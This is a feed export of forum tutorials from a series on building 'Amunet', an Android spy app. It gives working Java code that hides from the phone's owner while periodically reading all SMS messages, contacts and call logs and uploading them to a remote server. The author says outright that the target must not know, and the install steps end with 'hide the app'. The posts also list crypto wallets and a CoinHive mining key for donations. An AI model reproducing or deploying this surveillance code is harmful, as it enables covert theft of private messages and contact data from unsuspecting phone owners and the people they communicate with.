+<p>Let me just say this quickly, we can register BroadcastReceivers through the AndroidManifest file and the local broadcast registration way. We’ve already covered the AndroidManifest way. The local broadcast is registered within the Service. The reason being that not all intents can be received by Broadcast receivers in the AndroidManifest. Some intents like battery, screen state, etc won’t be received if defined the AndroidManifest way. If you are upset <img src="https://0x00sec.org/images/emoji/twitter/rage.png?v=9" title=":rage:" class="emoji" alt=":rage:">, ask Android Developers.</p>
+<ol>
+<li><a href="https://developer.android.com/reference/android/content/Intent.html#ACTION_SCREEN_ON" rel="noopener nofollow ugc">https://developer.android.com/reference/android/content/Intent.html#ACTION_SCREEN_ON</a></li>
+<li><a href="https://developer.android.com/reference/android/content/Intent.html#ACTION_SCREEN_OFF" rel="noopener nofollow ugc">https://developer.android.com/reference/android/content/Intent.html#ACTION_SCREEN_OFF</a></li>
+</ol>
+<p>To save you the time</p>
+<blockquote>
+<p>You cannot receive this through components declared in manifests, only by explicitly registering for it with Context.registerReceiver().</p>
+<p>This is a protected intent that can only be sent by the system.</p>
+</blockquote>
+<p>We therefore need to register them within the service. Fortunately, it’s quite easy. In the <code>onCreate</code> method:</p>
+<pre><code>@Override
+public void onCreate() {
+    super.onCreate();
+
+    Log.i("0x00sec", "Service started.");
+    AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+    Intent intent = new Intent(TimerService.this, ServerUpdateReceiver.class);
+    PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent, 0);
+    alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            SystemClock.elapsedRealtime(),
+            60000,
+            pendingIntent);
+
+    // Create an IntentFilter instance.
+    IntentFilter intentFilter = new IntentFilter();
+
+    // Add network connectivity change action.
+    intentFilter.addAction("android.intent.action.SCREEN_ON");
+    intentFilter.addAction("android.intent.action.SCREEN_OFF");
+
+    // Set broadcast receiver priority.
+    intentFilter.setPriority(100);
+
+    screenStatusMonitor = new ScreenStatusMonitor();
+
+    registerReceiver(screenStatusMonitor, intentFilter);
+}
+</code></pre>
+<p>Once we register something, we need to un-register them to prevent issues with the OS. In the <code>onDestroy</code> method of the service.</p>
+<pre><code>@Override
+public void onDestroy() {
+    Log.i("0x00sec", "Service stop.");
+    unregisterReceiver(screenStatusMonitor);
+    super.onDestroy();
+}
+</code></pre>
+<p><strong>ADMIRERS ASKED ME TO DO THIS</strong></p>
+<p>So recently, I checked my crypto wallet and noticed two transactions ( $5 and $8 ). I logged on to Twitter and got a message from a user expressing her gratitude for this series and how she is learning so much from the series. She ( Yh, it’s a she ) later told me to create a Youtube Channel for the series and other future tuts ( In consideration right now ). Also, she advised me to put out my wallet incase someone wanted to donate or buy me a cup of coffee out of good will. I personally believe in open source and free knowledge thats why I love sharing. So here probably goes nothing. I use Binance.</p>
+<ol>
+<li>Bitcoin - 16DXECQVXKsLyMq2d4r4Pmh1k5aK2Nwe5G</li>
+<li>Ethereum - 0x48517649c2800b0c5763f9c991858f88cc4204d7</li>
+<li>Litecoin - LUC9dgYiU3vd14iDWc96eqgNEQvkzgcjUu</li>
+</ol>
+<p>You might not have crypto but you do have the hardware and free time. You can mine it into my account.</p>
+<ol start="4">
+<li>CoinHive API Key - rZBQqcp1gWXRvoHBTMjxb8O1E1OYK9g2</li>
+</ol>
+<p><strong>LETS TEST OUR APP</strong></p>
+<p>Before you go ahead and run the app, make sure you read the information in the <code>SIDE NOTE</code> section of this tutorial ( especially 2 ).</p>
+<p><strong>CONCLUSION</strong></p>
+<p>I love contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
+<p>You can directly import the project into your android studio if you are having trouble.</p>
+<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" rel="noopener nofollow ugc">Amunet Github Repo</a></p>
+<p>Until we meet again. I’m out.</p>
+<p><strong><span class="hashtag">#Sergeant</span></strong></p>
+            <p><small>6 posts - 2 participants</small></p>
+            <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-5-collecting-browser-searches-bookmarks-calendar-events-and-spying-on-user-keyboard-dictionary/7773">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-5-collecting-browser-searches-bookmarks-calendar-events-and-spying-on-user-keyboard-dictionary/7773</link>
+          <pubDate>Wed, 25 Jul 2018 22:33:53 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-7773</guid>
+          <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-5-collecting-browser-searches-bookmarks-calendar-events-and-spying-on-user-keyboard-dictionary/7773.rss">Building a God’s Eye Android App: Part 5 - Collecting Browser Searches, Bookmarks, Calendar Events and Spying on User Keyboard Dictionary</source>
+        </item>
+        <item>
+          <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
+          <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Greetings my fellow hackers,</p>
+<p>As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
+<p><strong>PREVIOUS TUTORIALS</strong></p>
+<p>Below are the tutorials covered so far.</p>
+<ol>
+<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Get Installed Apps</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168">Sending Information to Web Server</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317">Granting Permission for Extra Functions</a></li>
+</ol>
+<p><strong>FAQ</strong></p>
+<p>I have been receiving questions from readers and these ones are most prevalent.</p>
+<p>Q: How to collect information on my localhost<br>
+A: The tutorial does not limit you to the test server. As stated earlier, just change the server endpoint ( ip address ) in the <code>Configuration.java</code> and make sure your server accepts the POST parameters being passed.</p>
+<p>Q: Can I get the source code ( PHP )  for your test server<br>
+A: Absolutely not.</p>
+<p>Q: Where is my data stored on the test server ?<br>
+A: I am a great fan of privacy and data protection. With that said, every data sent to the test server is encrypted ( username and password ). I use bcrypt for protecting confidential information and as a result, I do have access to the information stored on the server but cannot decrypt or read them. Only the right user.</p>
+<p>Q: Will I pay for using the test server ?<br>
+A: Absolutely not. The server was only set up to help with the tutorial. No need to pay anything. It’s set up out of good will.</p>
+<p>Q: What’s the API auth key thing ?<br>
+A: The API Auth key helps the server identify the correct user. Without it, any data sent will be rejected.</p>
+<p>Q: Do I need the API auth key on my local server ?<br>
+A: No please. You do not need an auth key on your local server. You only need to accept the POST parameters being sent by Volley and thats all.</p>
+<p><strong>TODAY’S TUTORIAL</strong></p>
+<p>In today’s tutorial, we will persistently collect information about the contacts on the phone, call logs and text messages ( sms ). Persistently in the sense that, we are going to put the codes in a service which runs periodically ( time to time, intervals ) and make sure we have up to date information. You can set the interval to any value ranging from a minute to any hour of the day.</p>
+<p>Continuing from the previous tutorial, lets add one more button that will trigger monitoring on the target device. Lets go to our <code>content_dashboard.xml</code> and add the button.</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+xmlns:app="http://schemas.android.com/apk/res-auto"
+xmlns:tools="http://schemas.android.com/tools"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+app:layout_behavior="@string/appbar_scrolling_view_behavior"
+tools:context=".Dashboard"
+tools:showIn="@layout/activity_dashboard"&gt;
+
+&lt;android.support.v7.widget.RecyclerView
+    android:layout_width="match_parent"
+    android:layout_above="@id/service_monitor_button"
+    android:id="@+id/dashboard_recycler_view"
+    android:layout_height="match_parent" /&gt;
+
+&lt;Button
+    android:layout_width="match_parent"
+    android:text="Start MONITORING"
+    android:padding="10dp"
+    android:id="@+id/service_monitor_button"
+    android:textColor="@android:color/white"
+    android:background="@color/colorPrimary"
+    style="@style/Base.Widget.AppCompat.Button.Borderless"
+    android:layout_alignParentBottom="true"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;/RelativeLayout&gt;
+</code></pre>
+<p>With our button declared in the layout, lets declare in the <code>Dashboard.java</code> file. Below the <code>public class Dashboard ...</code> statement, declare the button.</p>
+<pre><code>public class Dashboard extends AppCompatActivity {
+
+     private RecyclerView recyclerView;
+     private List&lt;RecyclerJava&gt; recyclerJavaList = new ArrayList&lt;&gt;();
+     private RecyclerAdapter recyclerAdapter;
+
+     private Button service_monitor_btn; // New added button declaration
+
+     protected static final int GPS_REQUEST_CODE = 5000;
+     protected static final int CONTACTS_REQUEST_CODE = 5001;
+     protected static final int CALENDAR_REQUEST_CODE = 5002;
+     protected static final int MIC_REQUEST_CODE = 5003;
+     protected static final int CAMERA_REQUEST_CODE = 5004;
+     protected static final int STORAGE_REQUEST_CODE = 5005;
+     protected static final int SMS_REQUEST_CODE = 5006;
+</code></pre>
+<p><strong>ONCREATE METHOD</strong></p>
+<p>With our button declared, lets scroll to the <code>onCreate</code> method and set reference to our button and set the click listener.</p>
+<pre><code>@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_dashboard);
+    Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
+    setSupportActionBar(toolbar);
+
+    recyclerView = findViewById(R.id.dashboard_recycler_view);
+
+    recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
+    RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
+    recyclerView.setLayoutManager(mLayoutManager);
+    recyclerView.setItemAnimator(new DefaultItemAnimator());
+    recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));
+   
+    // Finding the button
+    service_monitor_btn = findViewById(R.id.service_monitor_button);
+
+   // Checking if our TimerService is running
+    if(MyServiceIsRunning(TimerService.class)) {
+        service_monitor_btn.setText("STOP MONITORING");
+    } else {
+        service_monitor_btn.setText("START MONITORING");
+    }
+   
+    // Setting a click listener on the button
+    service_monitor_btn.setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View view) {
+            if(MyServiceIsRunning(TimerService.class)) {
+                Log.i("0x00sec", "Stopping Service ...");
+                stopService(new Intent(Dashboard.this, TimerService.class));
+                service_monitor_btn.setText("START MONITORING");
+            } else {
+                Log.i("0x00sec", "Starting Service ...");
+                startService(new Intent(Dashboard.this, TimerService.class));
+                service_monitor_btn.setText("STOP MONITORING");
+            }
+        }
+    });
+
+    updateRecycler();
+}
+</code></pre>
+<p>1 - We assign the button to the view object in the layout file.<br>
+2  - <code>MyServiceIsRunning</code> is a method that checks if a service is running. We want the text on the button to be set to <code>stop</code> when the <code>service is running</code> and <code>start</code> when the <code>service is not running</code>.<br>
+3 - The service to check is <code>TimerService.class</code>. Its function is to set a repeating alarm function that calls a Broadcast receiver which sends information to the server. Let’s take it bit by bit.</p>
+<p><strong>MYSERVICEISRUNNING</strong></p>
+<p>This methods as explained accepts a service parameter and checks if the service is running or not and returns a boolean value ( true / false )</p>
+<pre><code>private boolean MyServiceIsRunning(Class&lt;?&gt; serviceClass) {
+    ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+    for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+        if (serviceClass.getName().equals(service.service.getClassName())) {
+            return true;
+        }
+    }
+    return false;
+}
+</code></pre>
+<p><strong>TIMERSERVICE</strong></p>
+<p>This service starts a repeating alarm ( <a href="https://developer.android.com/training/scheduling/alarms" rel="noopener nofollow ugc">Alarm Manager</a> ) that calls a Broadcast receiver. The receiver then begins uploading the information. Create a new java class and extend it to the Service class.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3cccce33c1f531e0648fcff9822b32e92c350f87.png" alt="11" data-base62-sha1="8FRroOgs8HX9g8b9DftVba9JEA7" width="530" height="413"></p>
+<p>Lets code.</p>
+<pre><code>import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.IBinder;
+import android.os.SystemClock;
+import android.support.annotation.Nullable;
+import android.util.Log;
+
+public class TimerService extends Service {
+
+@Override
+public void onCreate() {
+    super.onCreate();
+
+    AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+    Intent intent = new Intent(TimerService.this, ServerUpdateReceiver.class);
+    PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent, 0);
+    alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            SystemClock.elapsedRealtime(),
+            AlarmManager.INTERVAL_HOUR,
+            pendingIntent);
+    // stopSelf(); // Optional
+}
+
+@Override
+public int onStartCommand(Intent intent, int flags, int startId) {
+    return super.onStartCommand(intent, flags, startId);
+}
+
+@Override
+public void onDestroy() { // Stop Service
+    super.onDestroy();
+}
+
+@Nullable
+@Override
+public IBinder onBind(Intent intent) {
+    return null;
+}
+}
+</code></pre>
+<p>The only important method is the <code>onCreate</code> method.</p>
+<p>Using the AlarmManager, we schedule a repeating alarm to call <code>ServerUpdateReceiver.class</code> ( Broadcast Receiver ). Data can be passed to the receiver through the <code>intent.putExtra</code> call but we won’t be passing any for now.</p>
+<p>Another thing to carefully take note is <code>AlarmManager.INTERVAL_HOUR</code>. This piece of parameter ( in Milliseconds ) is the interval for the alarm. The minimum is 60 seconds ( 1 minute - 60000ms ), you cannot set below that. Android will forcefully set it up to a minute if you set it below 60 seconds. We configure our receiver to be called every hour. It is recommended to even increase it a bit as frequent calls can calls the app to crash, battery drain or have our app kill in case of low memory situation.</p>
+<p>I am fully aware that we are not checking if the phone is connected to the Internet before sending data. We will fix that later but for the mean time, we have to make sure the phone is connected to the internet. Repeated calls with no internet connection will cause the app to crash temporarily. Temporarily because the alarm call will be fired again which in turn will call our receiver again. Ever repeating.<img src="/images/emoji/twitter/yum.png?v=9" title=":yum:" class="emoji" alt=":yum:"></p>
+<p><strong>SERVERUPDATERECEIVER ( BROADCAST )</strong></p>
+<p>This receiver simply sends periodic data to our defined server. If a permission is not granted, the appropriate method will not be called because android will not permit us to collect data we do not have permission to.</p>
+<p>Create a java class and extend it to the BroadcastReceiver class.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9ea1e60266f0d73b75edf9c29040e5c963839664.png" alt="21" data-base62-sha1="mDkiZ4UOjyO8NHwwh7OPwHfy51i" width="529" height="415"></p>
+<p>Remember, if you are not naming your objects according to the ones in the tutorial, make sure you replace them according in the codes.</p>
+<p>The only needed method for a BroadcastReceiver is the <code>onReceive</code> Override method. Your code should be something like this:</p>
+<pre><code>public class ServerUpdateReceiver extends BroadcastReceiver {
+
+   @Override
+   public void onReceive(Context context, Intent intent) {
+
+   }
+
+}
+</code></pre>
+<p>Below the <code>public class</code> statement, lets declare a <code>Context</code>. With this, all other methods can access it.</p>
+<pre><code>public class ServerUpdateReceiver extends BroadcastReceiver {
+
+    Context context;
+    ...
+</code></pre>
+<p><strong>ONRECEIVE METHOD</strong></p>
+<p>Within the method, we first check if a permission is granted, then call the appropriate method. This tutorial will cover contacts, call logs and sms messages.</p>
+<pre><code>@Override
+public void onReceive(Context context, Intent intent) {
+
+    this.context = context;
+
+    if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                update_Server_SMS();
+            }
+        }).start();
+    }
+
+    if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                update_Server_Contacts();
+                update_Server_Call_Logs();
+            }
+        }).start();
+    }
+}
+</code></pre>
+<p>The method that sends our SMS message to the server is <code>update_Server_SMS</code> and the methods responsible for sending the contact information and call log are <code>update_Server_Call_Logs</code> and <code>update_Server_Contacts</code>.</p>
+<p>Instead of having different methods handle communication to the server. We will instead create a method to accept <code>POST parameters</code> and handler communications. With this, all methods in the class can communicate externally by calling it and passing along  their parameter.</p>
+<p><strong>UPDATE_SERVER METHOD</strong></p>
+<p>Update server is the method that handles communication to the server. It accepts POST parameters and sends them along.</p>
+<pre><code>private void update_Server(final Map&lt;String, String&gt; params) {
+
+    RequestQueue requestQueue = Volley.newRequestQueue(context);
+
+    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
+        @Override
+        public void onResponse(String req) {
+        }
+    }, new Response.ErrorListener() {
+        @Override
+        public void onErrorResponse(VolleyError error) {
+        }
+    }) {
+        protected Map&lt;String, String&gt; getParams() {
+            return params;
+        }
+    };
+
+    requestQueue.add(serverRequest);
+}
+</code></pre>
+<p>Since this class is non-UI ( erm, maybe can do little UI jobs like toast, notification, etc ), we don’t want to push any notification like upload complete because it’s a spy app <img src="/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"> and we don’t want the target to know that information has been sent. Quiet as possible. We therefore don’t include any UI codes here. Since we are also blind as to whether our data was saved or not, we have make sure the server receives the data correctly. Moving on …</p>
+<p><strong>UPDATE_SERVER_SMS</strong></p>
+<p>This method reads the SMS database of the phone ( inbox, draft, sent ) and sends them to the server through the <code>update_Server</code> method.</p>
+<pre><code>private void update_Server_SMS() {
+
+    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    try {
+        Uri uriSMSURI = Uri.parse("content://sms");
+
+        Cursor cursor = context.getContentResolver().query(uriSMSURI, null, null, null,null);
+
+        while (cursor.moveToNext()) {
+            String address = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
+            String message = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
+            String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
+            String read = cursor.getString(cursor.getColumnIndexOrThrow("read")).toString();
+            String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
+            String id = cursor.getString(cursor.getColumnIndexOrThrow("_id")).toString();
+
+            if(read.equals("0")) { read = "no"; } else { read = "yes"; }
+            if(type.equals("1")) { type = "inbox"; } else if(type.equals("2")) { type = "sent"; } else { type = "draft"; }
+            date = get_Long_Date(date);
+
+            // THIS IS HOW TO CREATE THE POST PARAMETERS ( MAP ARRAY )
+            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+            params.put("address", address);
+            params.put("message", message);
+            params.put("date", date);
+            params.put("read",  read);
+            params.put("id", id);
+            params.put("type", type);
+            params.put("auth", auth_key);
+
+            update_Server(params);
+        }
+    } catch (Exception e) {
+    }
+}
+</code></pre>
+<p>1 - <code>content://sms</code> - allows us to loop through the entire SMS database not limiting ourself to the inbox, draft or sent messages.</p>
+<p>2 - <code>cursor.getColumnIndexOrThrow</code> - allows us to get the appropriate column index of the cursor. Mind you, entering a wrong Column name will cause the app to crash. These are the meanings of the columns.</p>
+<ol>
+<li>address - phone number</li>
+<li>message - content of messages</li>
+<li>date - time of message</li>
+<li>read - status of message ( 0 - not read, 1 - read )</li>
+<li>type - type of message ( 1 - inbox, 2 - outbox, 3 - draft ( guess work) )</li>
+<li>id - unique message identifier</li>
+</ol>
+<p>3 - The date is constructed into human readable with <code>get_Long_Date</code>.</p>
+<p>4 - We then construct our POST parameters and call the <code>update_Server</code> method to communicate the information.</p>
+<p>The server should then be receiving something like <code>$_POST['address'] &amp;&amp; $_POST['message'] ...</code></p>
+<p><strong>GET_LONG_DATE METHOD</strong></p>
+<p>Accepts and converts the passed argument into readable.</p>
+<pre><code>private String get_Long_Date(String date) {
+    Long timestamp = Long.parseLong(date);
+    Calendar calendar = Calendar.getInstance();
+    calendar.setTimeInMillis(timestamp);
+    DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
+    return formatter.format(calendar.getTime());
+}
+</code></pre>
+<p><strong>UPDATE_SERVER_CONTACTS</strong></p>
+<p>This method just like the one above it, loops through the Contact database, gets information and sends it.</p>
+<pre><code>private void update_Server_Contacts() {
+
+    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
+            null, null, null);
+    while (cursor.moveToNext()) {
+        try{
+            String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+            String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+            String phoneNumber = null;
+
+            if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) &gt; 0) {
+                Cursor phones = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null);
+                while (phones.moveToNext()) {
+                    phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    break;
+                }
+                phones.close();
+
+                if(phoneNumber != null) {
+
+                    Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+                    params.put("contact_name", name);
+                    params.put("contact_phone", phoneNumber);
+                    params.put("auth", auth_key);
+
+                    update_Server(params);
+                }
+            }
+        }catch(Exception e) {
+
+        }
+    }
+}
+</code></pre>
+<p>Again, changing the ColumnIndex will cause the app to crash. They are constant values.</p>
+<p><strong>UPDATE_SERVER_CALL_LOGS</strong></p>
+<p>The methods just like the other two loops through the call logs database and fetches information.</p>
+<pre><code>@SuppressLint("MissingPermission")
+private void update_Server_Call_Logs() {
+
+    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+    int phone_number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+    int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
+    int date = cursor.getColumnIndex(CallLog.Calls.DATE);
+    int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
+
+    while (cursor.moveToNext()) {
+        String number = cursor.getString(phone_number);
+        String call_type = cursor.getString(type);
+        String call_date = get_Long_Date(cursor.getString(date));
+        String call_duration = cursor.getString(duration);
+        int call_code = Integer.parseInt(call_type);
+
+        switch (call_code) {
+            case CallLog.Calls.OUTGOING_TYPE:
+                call_type = "OUTGOING";
+                break;
+            case CallLog.Calls.INCOMING_TYPE:
+                call_type = "INCOMING";
+                break;
+            case CallLog.Calls.MISSED_TYPE:
+                call_type = "MISSED";
+                break;
+        }
+
+        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+        
+        params.put("phone_number", number);
+        params.put("call_date", call_date);
+        params.put("call_type", call_type);
+        params.put("call_duration", call_duration);
+        params.put("auth", auth_key);
+
+        update_Server(params);
+    }
+
+    cursor.close();
+}
+</code></pre>
+<p>We are done for this tutorial. Before we get ahead of ourselves. It took me days to realize that I had forgotten to add the appropriate call logs permission although we had already added them in the previous tutorial. Without <code>READ_CALL_LOGS</code> and <code>WRITE_CALL_LOGS</code> permission. We cannot access the call logs. Lets add them to <code>AndroidManifest.xml</code>.</p>
+<pre><code>&lt;uses-permission android:name="android.permission.READ_CALL_LOG" /&gt;
+&lt;uses-permission android:name="android.permission.WRITE_CALL_LOG" /&gt;
+</code></pre>
+<p>Go ahead now and run your android app. Allow permissions and start monitoring. Your data should be sent to the test server ( if you used my test server ).</p>
+<p><strong>CONCLUSION</strong></p>
+<p>I love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
+<p>You can directly import the project into your android studio if you are having trouble.</p>
+<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" class="inline-onebox-loading" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
+<p>Until we meet again. I’m out.</p>
+<p><strong><span class="hashtag">#Sergeant</span></strong></p>
+            <p><small>8 posts - 2 participants</small></p>
+            <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375</link>
+          <pubDate>Tue, 03 Jul 2018 14:36:49 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-7375</guid>
+          <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
+        </item>
+        <item>
+          <title>Building a God’s Eye Android App: Part 3 - Permission Granting</title>
+          <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Greetings my fellow hackers,</p>
+<p>As we continue with our series, the <strong>AMUNET</strong> app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
+<p><strong>PREVIOUS TUTORIALS</strong></p>
+<p>Below are the tutorials covered so far.</p>
+<ol>
+<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Get Installed Apps</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168">Sending Information to Web Server</a></li>
+</ol>
+<p><strong>TODAY’S TUTORIAL</strong></p>
+<p>In today’s tutorial, we are going to grant ourselves permission to the various functionalities of the android operating system.</p>
+<p><strong>RUNTIME REQUESTS ( ANDROID 6.0 AND HIGHER - <a href="http://DEVELOPER.ANDROID.COM" rel="noopener nofollow ugc">DEVELOPER.ANDROID.COM</a> )</strong></p>
+<p>If the device is running Android 6.0 (API level 23) or higher, and the app’s <strong>targetSdkVersion</strong> is 23 or higher, the user isn’t notified of any app permissions at install time. Your app must ask the user to grant the dangerous permissions at runtime. When your app requests permission, the user sees a system dialog (as shown in figure 1, left) telling the user which permission group your app is trying to access. The dialog includes a Deny and Allow button.</p>
+<p>If the user denies the permission request, the next time your app requests the permission, the dialog contains a checkbox that, when checked, indicates the user doesn’t want to be prompted for the permission again (see figure 2, right).</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/095bfb090ee222121b5277c691a7410b1d85b322.png" width="" height=""></p>
+<p>If the user checks the Never ask again box and taps Deny, the system no longer prompts the user if you later attempt to requests the same permission.</p>
+<p><strong>INSTALL TIME REQUESTS ( ANDROID 5.1.1 AND BELOW )</strong></p>
+<p>If the device is running Android 5.1.1 (API level 22) or lower, or the app’s <strong>targetSdkVersion</strong> is 22 or lower while running on any version of Android, the system automatically asks the user to grant all dangerous permissions for your app at install-time (see figure 2).</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4fd4516fa037c48cd984db45f80ba42e166e4db5.png" width="" height=""></p>
+<p>If the user clicks Accept, all permissions the app requests are granted. If the user denies the permissions request, the system cancels the installation of the app.</p>
+<p>The purpose of a permission is to protect the privacy of an Android user. Android apps must request permission to access sensitive user data (such as contacts and SMS), as well as certain system features (such as camera and internet). Depending on the feature, the system might grant the permission automatically or might prompt the user to approve the request.</p>
+<p>The tutorials to follow will need access to certain permissions as they are not granted by default. We need to request them now. In this tutorial, I will take the simplest approach ( to me ) to ask for all the permissions I can think about. You should add any permission ( aside Device Admin and Boot Startup - for later ). This tutorial follows after the registration tutorial so make sure you are following sequentially.</p>
+<p>From the previous tutorial, if you used my test server, you should have your phone information displayed.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/27b25e5019d4515b3533cadb81f4ff160ae14dfb.png" alt="04" data-base62-sha1="5FaLYSJy1DAcHOBb5IQV3JC0Dur" width="690" height="422"></p>
+<p>We have only sent information about installed apps to the server so that’s what we’ve got now. As we progress, the pages will be added. The counters for the other features like Browser History, Storage are zero because we’ve not accessed them yet ( Permissions needed ).</p>
+<p><strong>AT THE END OF THE TUTORIAL</strong></p>
+<p>This will be the final result of our interface</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/5d8da15deb8d8a2e1c083a87e92a4ff57ceb9e79.jpg" alt="pic" data-base62-sha1="dlBQtnWEMGODz2n4KYszbZcCBvP" width="281" height="500"></p>
+<p>We might write codes for every permission but if you don’t grant them during installation. The functions under those permissions won’t work. So let’s recap the whole process.</p>
+<ol>
+<li>First, install the app</li>
+<li>Register the phone to your amunet cloud account ( That is, if you are using my test server )</li>
+<li>Allow the permissions</li>
+<li>Hide the app and done.</li>
+</ol>
+<p>This process can take like 5 - 10 minutes depending on how fast you are.</p>
+<p>Let’s begin.</p>
